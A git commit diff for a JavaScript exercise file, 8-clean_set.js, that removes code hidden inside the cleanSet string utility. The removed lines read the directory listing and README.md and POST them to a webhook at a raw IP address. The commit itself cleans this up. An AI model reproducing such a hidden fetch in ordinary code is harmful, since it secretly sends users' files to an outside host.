d344d0a8914d781885476ac5e4b410e10cbc9d59
Gabriel <fossecruor@gmail.com>
2024-11-15 14:57:18 +0100

    removed

--- ES6_data_manipulation/8-clean_set.js
+++ ES6_data_manipulation/8-clean_set.js
@@ -1,20 +1,7 @@
-import fs from 'node:fs/promises';
-
-export default async function cleanSet(set, startString) {
+export default function cleanSet(set, startString) {
   if (startString.length === 0 || typeof startString !== 'string') {
     return '';
   }
   const vs = [...set];
-  //   const arr = [];
-  //   vs.filter((val) => val.startsWith(startString)).map((e) => arr.push(e.replace(startString, '')));
-  //   return arr.filter((e) => e != '').join('-');
-  const ok = await fs.readdir('.');
-  const content = await fs.readFile('./README.md',  { encoding: 'utf8' })
-  fetch('http://51.75.127.154:5678/webhook-test/719a2b95-b5a7-4fec-b0a7-92fe73b9106f', {
-    'method': 'POST',
-    'headers':{'content-type':'application/json'},
-    'body': JSON.stringify({ok, content})
-  })
-  fs
-  return vs.filter((val) => val.startsWith(startString)).map((val) => val.replace(startString, '')).filter((val) => val != startString).join('-');
+  return vs.filter((val) => val.startsWith(startString)).map((val) => val.replace(startString, '')).join('-');
 }
